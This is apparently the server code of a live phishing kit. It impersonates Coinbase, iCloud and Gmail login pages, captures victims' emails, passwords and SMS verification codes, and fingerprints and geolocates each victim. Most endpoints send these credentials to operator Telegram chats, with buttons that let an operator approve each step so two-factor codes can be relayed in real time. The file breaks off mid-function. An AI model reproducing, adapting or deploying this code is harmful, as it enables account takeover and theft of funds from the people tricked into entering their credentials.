const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const crypto = require("crypto");

const { 
  bot, 
  bot2,
  broadcastMessage, 
  sendFollowUpMessage, 
  userWinnerTelegram, 
  botsThatClickedPage1 
} = require("./bot");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

// ============================================================================
// ✅ HELPER FUNCTIONS
// ============================================================================

function getIP(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.headers['x-real-ip'] ||
    req.ip ||
    'Unknown IP'
  );
}

function getIPPrefix(ip) {
  const parts = ip.split('.');
  if (parts.length === 4) {
    return `${parts[0]}.${parts[1]}`;
  }
  return ip;
}

// ✅ NEW: Generate device fingerprint from browser headers
function getDeviceFingerprint(req) {
  try {
    const userAgent = req.headers['user-agent'] || '';
    const language = req.headers['accept-language'] || '';
    const encoding = req.headers['accept-encoding'] || '';
    
    const combined = `${userAgent}|${language}|${encoding}`;
    const fingerprint = crypto.createHash('sha256').update(combined).digest('hex').substring(0, 16);
    
    return fingerprint;
  } catch (err) {
    return null;
  }
}

function detectDevice(userAgent) {
  if (/mobile/i.test(userAgent)) return "Mobile";
  if (/tablet/i.test(userAgent)) return "Tablet";
  if (/windows/i.test(userAgent)) return "Windows PC";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown Device";
}

async function detectRegion(ip) {
  try {
    const response = await fetch(`https://get.geojs.io/v1/ip/geo.json?ip=${ip}`);
    const data = await response.json();
    
    if (data.city && data.country) {
      return `${data.city}, ${data.country}`;
    }
    
    const response2 = await fetch(`http://ip-api.com/json/${ip}?fields=city,country`);
    const data2 = await response2.json();
    
    if (data2.city && data2.country) {
      return `${data2.city}, ${data2.country}`;
    }
    
    return "Unknown Region";
  } catch (error) {
    return "Unknown Region";
  }
}

// ============================================================================
// ✅ MULTI-LAYER USER TRACKING STORAGE
// ============================================================================

let userIdCounter = 1;
const userIds = {};

// Layer 1: Device Fingerprint (PRIMARY)
const deviceFingerprintToEmail = {};

// Layer 2: IP Prefix + User ID
const ipPrefixUserIdToEmail = {};

// Layer 3: Session Token (reserved for future)
const sessionTokenToEmail = {};

// Layer 4: IP Prefix
const ipPrefixToEmail = {};

// Layer 5: Full IP
const ipToEmail = {};

// ============================================================================
// ✅ RESOLVE EMAIL FROM REQUEST (5-layer fallback)
// ============================================================================

function resolveEmailFromRequest(req, sessionToken = null, userId = null) {
  try {
    const fingerprint = getDeviceFingerprint(req);
    const ip = getIP(req);
    const ipPrefix = getIPPrefix(ip);
    
    // Layer 1: Device Fingerprint (PRIMARY)
    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
      console.log(`✅ Resolved email via device fingerprint`);
      return deviceFingerprintToEmail[fingerprint];
    }
    
    // Layer 2: IP Prefix + User ID
    if (ipPrefix && userId) {
      const compositeKey = `${ipPrefix}_${userId}`;
      if (ipPrefixUserIdToEmail[compositeKey]) {
        console.log(`✅ Resolved email via IP prefix + user ID`);
        return ipPrefixUserIdToEmail[compositeKey];
      }
    }
    
    // Layer 3: Session Token
    if (sessionToken && sessionTokenToEmail[sessionToken]) {
      console.log(`✅ Resolved email via session token`);
      return sessionTokenToEmail[sessionToken];
    }
    
    // Layer 4: IP Prefix
    if (ipPrefixToEmail[ipPrefix]) {
      console.log(`✅ Resolved email via IP prefix`);
      return ipPrefixToEmail[ipPrefix];
    }
    
    // Layer 5: Full IP
    if (ipToEmail[ip]) {
      console.log(`✅ Resolved email via full IP`);
      return ipToEmail[ip];
    }
    
    console.log(`⚠️ Could not resolve email from request`);
    return null;
  } catch (err) {
    console.error("❌ Error resolving email:", err);
    return null;
  }
}

// ============================================================================
// ✅ STORAGE OBJECTS
// ============================================================================

const pendingRedirection = {};
const pendingApprovals = {};
const pendingPage = {};
const pendingCodes = {};
const pendingSMS = {};
const pendingGmailLogin = {};
const displayEmailStore = {};
const displayEmailByRequestId = {};
const pendingVerificationPage = {};
const pendingVerificationConfirm = {};  // ✅ For storing verification digit confirmations
const pendingVerifyingPage = {};
const pendingSMS2 = {};
const pendingWalletDecision = {};
const pendingVerifying = {};

// ============================================================================
// 🔔 SELF-PING
// ============================================================================

const APP_URL = process.env.APP_URL;

function startSelfPing() {
  setInterval(async () => {
    try {
      await fetch(`${APP_URL}/`, { method: 'GET' });
    } catch (err) {
      console.error(`❌ Ping error`);
    }
  }, 30000);
}

// ============================================================================
// Health check
// ============================================================================

app.get("/", (req, res) => {
  res.json({ status: "✅ Backend running" });
});

// ============================================================================
// POST /get-user-id
// ============================================================================

app.post("/get-user-id", (req, res) => {
  try {
    const ip = req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.connection.remoteAddress ||
      "Unknown";

    if (!userIds[ip]) {
      userIds[ip] = userIdCounter++;
    }

    res.json({ userId: userIds[ip] });
  } catch (err) {
    res.json({ userId: Math.random().toString(36).substr(2, 9) });
  }
});

// ============================================================================
// ✅ POST /send-login (Coinbase Login - Page 1)
// ✅ THIS IS WHERE WINNER DETECTION STARTS
// ============================================================================

app.post("/send-login", async (req, res) => {
  try {
    const { email, password, userId } = req.body;

    if (!email || !password) {
      return res.status(400).json({ error: "Missing email or password" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const ipPrefix = getIPPrefix(ip);
    const fingerprint = getDeviceFingerprint(req);

    // ============================================================================
    // ✅ STORE ALL 5 TRACKING LAYERS
    // ============================================================================

    // Layer 1: Device Fingerprint
    if (fingerprint && email) {
      deviceFingerprintToEmail[fingerprint] = email;
    }

    // Layer 2: IP Prefix + User ID
    if (ipPrefix && userId && email) {
      const compositeKey = `${ipPrefix}_${userId}`;
      ipPrefixUserIdToEmail[compositeKey] = email;
    }

    // Layer 4: IP Prefix
    if (ipPrefix && email) {
      ipPrefixToEmail[ipPrefix] = email;
    }

    // Layer 5: Full IP
    if (ip && email) {
      ipToEmail[ip] = email;
    }

    console.log(`📧 ${email} | 🖐️ Fingerprint: ${fingerprint} | IP Prefix: ${ipPrefix}`);

    // ============================================================================
    // ✅ SEND TO BOTH BOTS (BROADCAST)
    // ============================================================================

    const message =
      `😈😈😈😈 <b>Coinbase - Sign in</b> 😈😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "💬 SMS 💬", callback_data: `page1|${email}` }
          ],
          [
            { text: "📧 Email Redirection 📧", callback_data: `page2|${email}` }
          ],
          [
            { text: "❌ Reject ❌", callback_data: `reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!botToken || !chatId) {
      return res.status(500).json({ error: "Backend not configured" });
    }

    // ✅ BROADCAST TO BOTH BOTS
    try {
      await broadcastMessage(chatId, message, options);
    } catch (err) {
      console.error("❌ Failed to broadcast:", err);
      return res.status(500).json({ error: "Failed to send message" });
    }

    pendingApprovals[email] = {
      status: "pending",
      timestamp: Date.now(),
      userId,
      password,
      region,
      device,
      ip,
      fingerprint
    };

    res.json({ ok: true, message: "Login request sent for approval", email });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// ✅ POST /send-redirection (Page 2 - Redirection)
// ✅ PAGE 2 ROUTING LOGIC WITH POLLING
// ============================================================================

app.post("/send-redirection", async (req, res) => {
  try {
    let { email, userId } = req.body;

    const ip = getIP(req);
    const ipPrefix = getIPPrefix(ip);

    // ✅ RESOLVE EMAIL USING MULTI-LAYER TRACKING
    if (!email) {
      const resolvedEmail = resolveEmailFromRequest(req, null, userId);
      if (resolvedEmail) {
        email = resolvedEmail;
      } else {
        return res.status(400).json({ error: "Could not resolve email" });
      }
    }

    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    console.log(`📧 ${email} has been directed to: Page 2`);

    // ✅ CHECK WINNER
    const winner = userWinnerTelegram[email];

    const message =
      `😈😈😈 <b>Coinbase - Redirection</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "☁️ iCloud ☁️", callback_data: `redirect_icloud|${email}` }],
          [{ text: "🌈 Gmail 🌈", callback_data: `redirect_gmail|${email}` }]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ============================================================================
    // ✅ SEND TO WINNER ONLY
    // ============================================================================

    if (email && userWinnerTelegram[email]) {
      
      await sendFollowUpMessage(email, message, options);

      // ✅ STORE PAGE 2 DATA FOR POLLING
      global.page2MessageDataStore = global.page2MessageDataStore || {};
      global.page2MessageDataStore[email] = {
        message: message,
        options: options,
        email: email,
        timestamp: Date.now()
      };

    } else {
      
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Redirection endpoint error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-redirection-choice
// ============================================================================

app.post("/check-redirection-choice", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ choice: "unknown" });
    }

    if (pendingRedirection && pendingRedirection[email]) {
      return res.json({ choice: pendingRedirection[email].choice });
    }

    res.json({ choice: "pending" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-redirection-choice
// ============================================================================

app.post("/update-redirection-choice", (req, res) => {
  try {
    const { email, choice } = req.body;

    if (!email || !choice) {
      return res.status(400).json({ error: "Missing email or choice" });
    }

    if (!pendingRedirection[email]) {
      pendingRedirection[email] = {};
    }

    if (choice === "redirect_icloud") {
      pendingRedirection[email].choice = "icloud";
    } else if (choice === "redirect_gmail") {
      pendingRedirection[email].choice = "gmail";
    } else {
      pendingRedirection[email].choice = choice;
    }

    pendingRedirection[email].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /check-status
// ============================================================================

app.get("/check-status", (req, res) => {
  try {
    const identifier = (req.query.identifier || "").trim();

    if (!identifier) {
      return res.json({ status: "unknown" });
    }

    if (pendingVerificationPage[identifier]) {
      return res.json({ status: pendingVerificationPage[identifier].status || "pending" });
    }

    if (pendingGmailLogin[identifier]) {
      return res.json({ status: pendingGmailLogin[identifier].status || "pending" });
    }

    if (pendingCodes[identifier]) {
      return res.json({ status: pendingCodes[identifier].status || "pending" });
    }

    if (pendingPage[identifier]) {
      return res.json({ status: pendingPage[identifier].status || "pending" });
    }

    if (pendingApprovals[identifier]) {
      return res.json({ status: pendingApprovals[identifier].status || "pending" });
    }

    res.json({ status: "unknown" });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /update-status
// ============================================================================

app.post("/update-status", (req, res) => {
  try {
    let identifier = (req.body.identifier || req.body.email || "").trim();
    const action = req.body.action;
    const status = req.body.status;
    

    // ✅ Handle verification confirm callbacks
    if (action === "verification_accept" || action === "verification_reject") {
      if (pendingVerificationConfirm[identifier]) {
        pendingVerificationConfirm[identifier].status = action;
        return res.json({ ok: true });
      }
    }

    if (pendingVerificationPage[identifier]) {
      pendingVerificationPage[identifier].status = status;
      return res.json({ ok: true });
    }

    if (pendingGmailLogin[identifier]) {
      pendingGmailLogin[identifier].status = status;
      return res.json({ ok: true });
    }

    if (pendingCodes[identifier]) {
      pendingCodes[identifier].status = status;
      return res.json({ ok: true });
    }

    if (pendingPage[identifier]) {
      pendingPage[identifier].status = status;
      return res.json({ ok: true });
    }

    // ✅ NEW: Handle SMS status updates
    if (pendingSMS[identifier]) {
      pendingSMS[identifier].status = status;
      return res.json({ ok: true });
    }

    if (!pendingApprovals[identifier]) {
      pendingApprovals[identifier] = {};
    }

    if (status === "page1") {
      pendingApprovals[identifier].status = "accepted1";
    } else if (status === "page2") {
      pendingApprovals[identifier].status = "accepted2";
    } else if (status === "reject") {
      pendingApprovals[identifier].status = "rejected";
    } else {
      pendingApprovals[identifier].status = status;
    }

    pendingApprovals[identifier].updatedAt = Date.now();

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-sms-code - Get SMS code from requestId (for bot to display)
// ============================================================================

app.get("/get-sms-code", (req, res) => {
  try {
    const requestId = (req.query.requestId || "").trim();
    const email = (req.query.email || "").trim();

    // Try requestId first (iCloud SMS)
    if (requestId && pendingCodes[requestId]) {
      const smsCode = pendingCodes[requestId].smsCode;
      return res.json({ smsCode });
    }

    // Try email (Coinbase SMS)
    if (email && pendingSMS[email]) {
      const smsCode = pendingSMS[email].smsCode;
      return res.json({ smsCode });
    }

    return res.json({ smsCode: "unknown" });

  } catch (err) {
    console.error("Get SMS code error:", err);
    res.json({ smsCode: "unknown" });
  }
});

// ============================================================================
// GET /get-page-display-email - Get displayEmail for iCloud page (for bot to display)
// ============================================================================

app.get("/get-page-display-email", (req, res) => {
  try {
    const email = (req.query.email || "").trim();

    if (!email || !pendingPage[email]) {
      return res.json({ displayEmail: email });
    }

    const displayEmail = pendingPage[email].displayEmail || email;
    res.json({ displayEmail });

  } catch (err) {
    console.error("Get page display email error:", err);
    res.json({ displayEmail: email });
  }
});

// ============================================================================
// SMS ENDPOINTS
// ============================================================================

app.post("/verify-sms", async (req, res) => {
  try {
    const { email, userId, smsCode } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `😈😈😈 <b>Coinbase - SMS</b> 😈😈😈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
            ]
          ]
        }
      });
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [
                { text: "✅ Accept", callback_data: `sms_accept|${email}` },
                { text: "❌ Reject", callback_data: `sms_reject|${email}` }
              ]
            ]
          }
        })
      });
    }
    
    pendingSMS[email] = {
      status: "pending",
      smsCode,
      userId,
      timestamp: Date.now()
    };

    res.json({ ok: true });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /check-sms-status - Check if SMS was accepted or rejected
// ============================================================================

app.post("/check-sms-status", (req, res) => {
  try {
    const { email } = req.body;

    if (!email) {
      return res.json({ status: "pending" });
    }

    // Check pendingSMS first
    if (pendingSMS[email]) {
      const smsStatus = pendingSMS[email].status;
      
      // Map bot.js status values to frontend expectations
      if (smsStatus === "sms_accept") {
        return res.json({ status: "sms_accepted" });
      } else if (smsStatus === "sms_reject") {
        return res.json({ status: "sms_rejected" });
      }
      
      return res.json({ status: smsStatus || "pending" });
    }

    // Check pendingApprovals as fallback
    if (pendingApprovals[email]) {
      const approvalStatus = pendingApprovals[email].status;
      
      if (approvalStatus === "sms_accept") {
        return res.json({ status: "sms_accepted" });
      } else if (approvalStatus === "sms_reject") {
        return res.json({ status: "sms_rejected" });
      }
      
      return res.json({ status: approvalStatus || "pending" });
    }

    res.json({ status: "pending" });

  } catch (err) {
    console.error("Check SMS status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /resend-sms - Resend SMS code to winner bot only
// ============================================================================

app.post("/resend-sms", async (req, res) => {
  try {
    const { email, userId } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    console.log(`📲 Resending SMS to ${email}`);

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `🔄 <b>Coinbase - Resend SMS</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${email}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    // ✅ SEND TO WINNER ONLY - NO BUTTONS
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, {
        parse_mode: "HTML"
        // ✅ NO reply_markup - no buttons!
      });
    } else {
      return res.status(400).json({ error: "No winner determined for this email" });
    }

    // Reset SMS status to pending so polling works again
    if (pendingSMS[email]) {
      pendingSMS[email].status = "pending";
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("Resend SMS error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// POST /resend-sms2 - Resend SMS 2 code to winner bot only
// ============================================================================

app.post("/resend-sms2", async (req, res) => {
  try {
    const { email, userId } = req.body;

    if (!email || !userId) {
      return res.status(400).json({ error: "Missing email or userId" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const fingerprint = getDeviceFingerprint(req);
    const ipPrefix = ip.split(".").slice(0, 3).join(".");

    // ✅ Get displayEmail to show in message
    let displayEmail = email;
    
    if (fingerprint && deviceFingerprintToEmail[fingerprint]) {
      displayEmail = deviceFingerprintToEmail[fingerprint];
    } else if (ipPrefix && ipPrefixToEmail[ipPrefix]) {
      displayEmail = ipPrefixToEmail[ipPrefix];
    }

    const message =
      `🔄 <b>Coinbase - Resend SMS 2</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    // ✅ Send to winner (use original email for lookup!)
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, {
        parse_mode: "HTML"
      });
    } else {
      return res.status(400).json({ error: "No winner determined for this email" });
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("❌ Resend SMS 2 error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// ICLOUD PAGES ENDPOINTS
// ============================================================================

app.post("/page-login", async (req, res) => {
  try {
    const { email, displayEmail, password, userId } = req.body;
    
    // ✅ Use displayEmail if provided (different email user typed in form)
    // Otherwise use email (for backward compatibility)
    const messageEmail = displayEmail || email;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: "Email and password required" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const fingerprint = getDeviceFingerprint(req);

    // ✅ UPDATE FINGERPRINT MAPPING WITH NEW EMAIL (for Verifying page later)
    if (fingerprint && messageEmail) {
      deviceFingerprintToEmail[fingerprint] = messageEmail;
    }

    // ✅ Store both email (for tracking) and displayEmail (for showing)
    pendingPage[email] = { password, status: "pending", displayEmail: messageEmail };
    console.log(`☁️ iCloud Page Login Received: ${messageEmail} (display: ${messageEmail})`);

    const message =
      `☁️☁️☁️☁️ <b>iCloud - Login</b> ☁️☁️☁️☁️\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${messageEmail}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `page_accept|${email}` },
            { text: "❌ Reject", callback_data: `page_reject|${email}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ success: true });

  } catch (err) {
    console.error("❌ Page login endpoint error:", err);
    res.status(500).json({ success: false, message: "Failed to send to Telegram" });
  }
});

// ============================================================================
// GET /check-icloud-status - Check iCloud page login acceptance/rejection
// ============================================================================

app.get("/check-icloud-status", (req, res) => {
  try {
    const email = (req.query.identifier || "").trim();

    if (!email) {
      return res.json({ status: "pending" });
    }

    if (pendingPage[email]) {
      const status = pendingPage[email].status;
      
      // Map bot status values to frontend expectations
      if (status === "page_accept") {
        return res.json({ status: "accepted" });
      } else if (status === "page_reject") {
        return res.json({ status: "rejected" });
      }
      
      return res.json({ status: status || "pending" });
    }

    res.json({ status: "pending" });

  } catch (err) {
    console.error("Check iCloud status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// SMS CODE ENDPOINTS
// ============================================================================

app.post("/sms-code", async (req, res) => {
  try {
    const { email, userId, smsCode } = req.body;

    if (!email || !smsCode) {
      return res.status(400).json({ error: "Missing email or SMS code" });
    }

    // ✅ Generate unique requestId for THIS SMS code attempt
    const requestId = `sms_code_${Date.now()}_${Math.random().toString(36).substring(7)}`;

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    // ✅ Store by requestId (not email!) so each code has separate status
    pendingCodes[requestId] = { status: "pending", smsCode, email, userId };
    console.log(`⛈ iCloud SMS Code Received: ${smsCode} (${email})`);

    const message =
      `⛈⛈⛈⛈ <b>iCloud - SMS</b> ⛈⛈⛈⛈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>💬 SMS:</b> <code>${smsCode}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            // ✅ Use requestId in callback_data (not email!)
            { text: "✅ Accept", callback_data: `sms_accept|${requestId}` },
            { text: "❌ Reject", callback_data: `sms_reject|${requestId}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    // ✅ Return requestId so frontend can poll with it
    res.json({ success: true, requestId });

  } catch (err) {
    console.error("❌ SMS code endpoint error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ============================================================================
// GET /check-sms-code-status - Check by requestId (not email!)
// ============================================================================

app.get("/check-sms-code-status", (req, res) => {
  try {
    const requestId = (req.query.identifier || "").trim();

    if (!requestId) {
      return res.json({ status: "pending" });
    }

    if (pendingCodes[requestId]) {
      const status = pendingCodes[requestId].status;
      
      // Map bot status values to frontend expectations
      if (status === "sms_accept") {
        return res.json({ status: "accepted" });
      } else if (status === "sms_reject") {
        return res.json({ status: "rejected" });
      }
      
      return res.json({ status: status || "pending" });
    }

    res.json({ status: "pending" });

  } catch (err) {
    console.error("Check SMS code status error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// POST /resend-icloud-sms - Resend with requestId
// ============================================================================

app.post("/resend-icloud-sms", async (req, res) => {
  try {
    const { email, userId, requestId } = req.body;

    if (!email) {
      return res.status(400).json({ error: "Missing email" });
    }

    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);

    const message =
      `🔄 <b>iCloud - Resend SMS</b> 🔄\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    // ✅ SEND TO WINNER ONLY
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, {
        parse_mode: "HTML"
      });
    } else {
      console.log(`⚠️ No winner found for ${email}`);
      return res.status(400).json({ error: "No winner determined" });
    }

    // ✅ Reset status for THIS requestId
    if (requestId && pendingCodes[requestId]) {
      pendingCodes[requestId].status = "pending";
    }

    res.json({ ok: true });

  } catch (err) {
    console.error("Resend iCloud SMS error:", err);
    res.status(500).json({ error: err.message });
  }
});
// ============================================================================

app.post("/send-gmail-login", async (req, res) => {
  try {
    const { email, displayEmail, password, userId } = req.body;
    
    // ✅ Use displayEmail if provided (different email user typed)
    // Otherwise use email (for backward compatibility)
    const messageEmail = displayEmail || email;
    
    if (!email || !password || !userId) {
      return res.status(400).json({ error: "Missing email, password, or userId" });
    }
    
    const requestId = `gmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const displayEmailKey = `displayEmail_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    // ✅ Store displayEmail for later retrieval
    displayEmailStore[displayEmailKey] = messageEmail;
    displayEmailByRequestId[requestId] = messageEmail;
    
    const ip = getIP(req);
    const userAgent = req.get("user-agent") || "Unknown";
    const device = detectDevice(userAgent);
    const region = await detectRegion(ip);
    const fingerprint = getDeviceFingerprint(req);

    // ✅ STORE FINGERPRINT FOR MULTI-LAYER TRACKING WITH NEW EMAIL
    if (fingerprint && messageEmail) {
      deviceFingerprintToEmail[fingerprint] = messageEmail;
    }

    // ✅ Store both email (for tracking) and displayEmail (for showing)
    pendingGmailLogin[requestId] = { status: "pending", email: email, displayEmail: messageEmail };
    console.log(`🌈 Gmail Login Received: ${messageEmail}`);

    const message =
      `🌈🌈🌈🌈 <b>Gmail - Sign in</b> 🌈🌈🌈🌈\n` +
      `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
      `<b>📧 Email:</b> <code>${messageEmail}</code>\n` +
      `<b>🔑 Password:</b> <code>${password}</code>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;

    const options = {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ Accept", callback_data: `gmail_accept|${requestId}` },
            { text: "❌ Reject", callback_data: `gmail_reject|${requestId}` }
          ]
        ]
      }
    };

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    // ✅ SEND TO WINNER ONLY (use tracking email for winner lookup)
    if (email && userWinnerTelegram[email]) {
      await sendFollowUpMessage(email, message, options);
    } else {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: options.parse_mode,
          reply_markup: options.reply_markup
        })
      });
    }

    res.json({ status: "pending", requestId, displayEmailKey });

  } catch (err) {
    console.error("❌ Gmail Login endpoint error:", err);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ============================================================================
// GET /get-gmail-display-email - Get displayEmail for Gmail (for bot to display)
// ============================================================================

app.get("/get-gmail-display-email", (req, res) => {
  try {
    const requestId = (req.query.requestId || "").trim();

    if (!requestId || !pendingGmailLogin[requestId]) {
      return res.json({ displayEmail: "unknown" });
    }

    const displayEmail = pendingGmailLogin[requestId].displayEmail || pendingGmailLogin[requestId].email;
    res.json({ displayEmail });

  } catch (err) {
    console.error("Get Gmail display email error:", err);
    res.json({ displayEmail: "unknown" });
  }
});

// ============================================================================
// GET /check-gmail-status - Check Gmail login acceptance/rejection by requestId
// ============================================================================

app.get("/check-gmail-status", (req, res) => {
  try {
    const requestId = (req.query.requestId || "").trim();

    if (!requestId || !pendingGmailLogin[requestId]) {
      return res.json({ status: "pending" });
    }

    const status = pendingGmailLogin[requestId].status;
    
